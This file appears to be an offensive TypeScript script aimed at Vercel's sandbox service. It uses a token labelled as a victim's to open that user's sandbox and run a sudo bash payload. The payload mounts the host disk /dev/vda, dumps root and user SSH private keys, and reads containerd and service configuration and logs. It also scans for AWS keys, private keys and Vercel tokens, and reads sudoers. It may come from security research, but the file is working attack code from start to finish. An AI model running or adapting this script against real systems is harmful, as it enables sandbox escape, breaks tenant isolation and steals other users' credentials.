import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
mkdir -p /mnt/vda2
mount -t xfs /dev/vda /mnt/vda2 2>/dev/null
R=/mnt/vda2
echo "===== /root/.ssh ====="
ls -la $R/root/.ssh 2>&1
for f in $R/root/.ssh/*; do echo "--- $f ---"; cat "$f" 2>&1 | head -10; done
echo "===== /home/vercel ====="
ls -la $R/home/vercel 2>&1 | head -40
echo "--- /home/vercel/.ssh ---"; ls -la $R/home/vercel/.ssh 2>&1; for f in $R/home/vercel/.ssh/*; do echo "[$f]"; cat "$f" 2>&1 | head -8; done
echo "--- dotfiles ---"
find $R/home/vercel -maxdepth 2 -name ".*" -o -name "*.json" -o -name "*.toml" -o -name "*.yaml" 2>/dev/null | head -20
echo "===== /opt/vercel ====="
ls -la $R/opt/vercel 2>&1
echo "--- /opt/cni ---"; ls -la $R/opt/cni 2>&1
echo "===== /var/celld ====="
ls -laR $R/var/celld 2>&1 | head -40
echo "===== /var/log ====="
ls -laR $R/var/log 2>&1 | head -60
echo "===== /etc/containerd/config.toml ====="
cat $R/etc/containerd/config.toml 2>&1
echo "===== containerd override ====="
cat $R/etc/systemd/system/containerd.service.d/override.conf 2>&1
echo "===== /var/lib/containerd ====="
ls -la $R/var/lib/containerd 2>&1 | head
echo "--- io.containerd.snapshotter.v1.overlayfs ---"; ls -la $R/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs 2>&1 | head
echo "--- io.containerd.content.v1.content ---"; ls -la $R/var/lib/containerd/io.containerd.content.v1.content/blobs/sha256 2>&1 | head -20
echo "===== systemd units of interest ====="
ls $R/etc/systemd/system/ 2>&1 | head -40
echo "--- cell service unit ---"
for u in $R/etc/systemd/system/*cell* $R/lib/systemd/system/*cell*; do echo "[$u]"; cat "$u" 2>&1 | head -30; done
echo "===== find tokens/keys in cell filesystem (fast scan) ====="
grep -rIl -E "AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY|vercel_token|vct_|sk_|pk_live|api[_-]?key" $R/opt $R/var/celld $R/var/log $R/root $R/home 2>/dev/null | head -20
echo "===== celld logs token-like strings ====="
grep -rhIE -o "vct_[A-Za-z0-9]+|vca_[A-Za-z0-9]+|vcr_[A-Za-z0-9]+|vcl_[A-Za-z0-9]+|sbx_[A-Za-z0-9]+|prj_[A-Za-z0-9]+|team_[A-Za-z0-9]+|https?://[A-Za-z0-9./_-]+" $R/var/log $R/var/celld 2>/dev/null | sort -u | head -40
echo "===== mount table inside cell /proc/mounts ====="
cat $R/proc/mounts 2>/dev/null | head -20
echo "===== crontabs / sudoers ====="
cat $R/etc/sudoers 2>&1 | head
ls -la $R/etc/sudoers.d 2>&1 | head
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore2.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore2.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 180_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });